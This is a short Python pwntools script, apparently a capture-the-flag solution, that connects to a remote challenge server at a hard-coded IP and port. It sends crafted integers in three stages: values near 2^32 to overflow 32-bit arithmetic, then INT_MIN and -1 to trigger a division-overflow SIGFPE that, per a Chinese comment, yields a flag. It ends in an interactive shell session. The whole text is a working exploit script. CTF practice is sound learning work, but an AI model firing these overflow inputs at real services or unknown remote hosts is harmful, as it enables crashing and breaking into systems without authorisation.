from pwn import *

# p = process('./pwn')
p = remote('211.65.197.50', 20880)

# 第一题
p.sendlineafter(b'a:', b'4294967304')
p.sendlineafter(b'b:', b'4294967295')

# 第二题
p.sendlineafter(b'a:', b'9629')
p.sendlineafter(b'b:', b'446045')

# 第三题（触发 SIGFPE → cat flag）
p.sendlineafter(b'a:', b'-2147483648')
p.sendlineafter(b'b:', b'-1')

p.interactive()
